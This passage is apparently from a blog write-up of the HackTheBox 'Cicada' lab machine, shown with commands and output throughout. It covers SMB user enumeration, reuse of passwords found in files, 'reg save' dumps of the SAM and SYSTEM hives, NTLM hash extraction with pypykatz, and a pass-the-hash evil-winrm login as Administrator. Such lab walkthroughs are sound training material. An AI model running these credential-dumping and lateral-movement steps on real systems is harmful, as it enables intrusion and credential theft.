class="line">SMB         10.129.192.186  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        [+] cicada.htb\anonymous: </span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        [+] Brute forcing RIDs</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)</span><br><span class="line">SMB         10.129.192.186  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<p>Now we can create a wordlist using those usernames and we’ll discover our valid user is <code>michael.wrightson</code>. Let’s try using him to get something more useful. We can do so using ldapdomaindump tool:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ldapdomaindump ldap://10.129.192.186 -u <span class="string">&#x27;cicada.htb\michael.wrightson&#x27;</span> -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span></span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We can find this inside of the users dump file:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Just <span class="keyword">in</span> <span class="keyword">case</span> I forget my password is aRt<span class="variable">$Lp</span><span class="comment">#7t*VQ!3</span></span><br></pre></td></tr></table></figure></div>

<p>Let’s now see if we can use that password which belongs to david.orelious against our SMB shares:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ smbclient  \\\\10.129.192.186\\DEV -U david.orelious</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\david.orelious]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Mar 14 13:31:39 2024</span><br><span class="line">  ..                                  D        0  Thu Mar 14 13:21:29 2024</span><br><span class="line">  Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024</span><br><span class="line"></span><br><span class="line">                4168447 blocks of size 4096. 439019 blocks available</span><br><span class="line">smb: \&gt; get Backup_script.ps1</span><br><span class="line">getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We find a powershell script that we download to our local machine. Let’s see what it has for us:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sourceDirectory</span> = <span class="string">&quot;C:\smb&quot;</span></span><br><span class="line"><span class="variable">$destinationDirectory</span> = <span class="string">&quot;D:\Backup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;emily.oscars&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConvertTo-SecureString <span class="string">&quot;Q!3@Lp#M6b*7t*Vt&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$credentials</span> = New-Object System.Management.Automation.PSCredential(<span class="variable">$username</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="variable">$dateStamp</span> = Get-Date -Format <span class="string">&quot;yyyyMMdd_HHmmss&quot;</span></span><br><span class="line"><span class="variable">$backupFileName</span> = <span class="string">&quot;smb_backup_<span class="variable">$dateStamp</span>.zip&quot;</span></span><br><span class="line"><span class="variable">$backupFilePath</span> = Join-Path -Path <span class="variable">$destinationDirectory</span> -ChildPath <span class="variable">$backupFileName</span></span><br><span class="line">Compress-Archive -Path <span class="variable">$sourceDirectory</span> -DestinationPath <span class="variable">$backupFilePath</span></span><br><span class="line">Write-Host <span class="string">&quot;Backup completed successfully. Backup file saved to: <span class="variable">$backupFilePath</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>It has a new password for us, this time for emily.oscars. Let’s try to connect to the machine directly using it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -i 10.129.192.186 -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">cat</span> ../desktop/user.txt</span><br><span class="line">716fc9cf133233d53d2c24284632aa04</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we get our user flag!</p>
<h3 id="Privilege-Escalation-SeBackupPrivilege"><a href="#Privilege-Escalation-SeBackupPrivilege" class="headerlink" title="Privilege Escalation - SeBackupPrivilege"></a>Privilege Escalation - SeBackupPrivilege</h3><p>Checking emily’s privileges:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Doing a quick search for <code>SeBackupPrivilege</code> I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" >this great article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.<br>This privilege allows the user to read all the files in the system, we will use this to our advantage.<br>I’ll go ahead and read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">mkdir</span> Temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         2/15/2025  12:34 PM                Temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; reg save hklm\sam c:\Temp\sam</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; reg save hklm\system c:\Temp\system</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">cd</span> Temp</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Temp&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Temp&gt; </span><br><span class="line">download sam</span><br><span class="line">*Evil-WinRM* PS C:\Temp&gt; download sam</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\Temp\sam to sam</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\Temp&gt; download system</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now we’ll just extract the hive secrets from the files using pypykatz:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/cicada]</span><br><span class="line">└─$ pypykatz registry --sam sam system</span><br><span class="line">/usr/bin/pypykatz:6: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import load_entry_point</span><br><span class="line">WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work</span><br><span class="line">WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work</span><br><span class="line">============== SYSTEM hive secrets ==============</span><br><span class="line">CurrentControlSet: ControlSet001</span><br><span class="line">Boot Key: 3c2b033757a49110a9ee680b46e8d620</span><br><span class="line">============== SAM hive secrets ==============</span><br><span class="line">HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And now simply connect to the server using our Administrator hash and claim our root flag:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -i 10.129.192.186 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341  </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">0b2a350ae69d0db519f0d06c503adf5b</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>That was it for cicada! Thanks for reading!</p>
<p>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: Cicada</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-02-14 17:30:43</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-02-15 17:41:04
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/02/14/Hackthebox-Cicada/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/02/21/Hackthebox-Yummy/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Yummy</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/02/07/Hackthebox-MagicGardens/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: MagicGardens</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: Cicada</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Access-to-Credentials-exfiltration"><span class="nav-text">SMB Access to Credentials exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-SeBackupPrivilege"><span class="nav-text">Privilege Escalation - SeBackupPrivilege</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
